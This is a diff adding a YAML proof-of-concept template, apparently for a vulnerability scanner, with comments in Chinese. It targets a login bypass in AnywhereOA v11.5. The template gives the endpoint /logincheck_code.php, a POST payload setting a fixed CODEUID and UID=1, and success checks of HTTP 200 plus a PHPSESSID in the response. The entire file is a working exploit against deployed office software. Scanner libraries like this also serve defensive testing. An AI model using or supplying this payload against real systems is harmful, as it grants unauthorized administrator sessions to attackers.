@@ -1,0 +1,36 @@
+#poc名称
+- name:
+  - name: "AnywhereOA_v11.5_logincheck_code.php_login_bypass"
+
+#请求方式
+- method:
+  - method: "post"
+
+#漏洞的位置
+- url:
+  - url : "/logincheck_code.php"
+
+#payload
+- payload:
+  - payload: 'CODEUID=%7BD384F12E-A758-F44F-8A37-20E2568306A7%7D&UID=1'
+
+#response包里状态码
+- status:
+  - status: "200"
+
+#response包里的关键字
+- word:
+  - word:
+      - "PHPSESSID"
+
+#验证是否攻击成功的 请求方式
+- method-V:
+  - method: "isNone"
+
+#webshell位置
+- verify:
+  - verify : "isNone"
+
+#cmd 为了适配Java反序列化漏洞
+- cmd:
+  - cmd : "isNone"
